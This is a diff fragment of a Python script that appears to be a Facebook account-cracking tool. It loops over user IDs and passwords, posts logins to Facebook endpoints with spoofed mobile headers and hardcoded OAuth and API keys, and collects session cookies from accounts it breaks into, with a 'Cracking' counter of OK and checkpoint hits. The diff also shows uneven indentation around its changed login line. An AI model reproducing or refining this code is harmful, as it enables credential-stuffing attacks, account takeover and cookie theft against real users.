@@ -243,6 +243,7 @@ def shakilx(uid,pwx,tl):
 				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 				'x-fb-connection-type':'unknown',
 				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+				'api_key': '8114af471d039628db5c68cb127af936',
 				'user-agent':ua_string,
 				'x-fb-net-hni':str(random.randint(2e4,4e4)),
 				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
@@ -250,7 +251,7 @@ def shakilx(uid,pwx,tl):
 				'x-fb-friendly-name':'authenticate',
 				'accept-encoding':'gzip, deflate',
 				'x-fb-http-engine':	'Liger'}
-				url = 'https://b-api.facebook.com/method/auth.login'
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -272,7 +273,7 @@ def shakilx(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96m𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s\033[0;97m[\033[1;96m𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
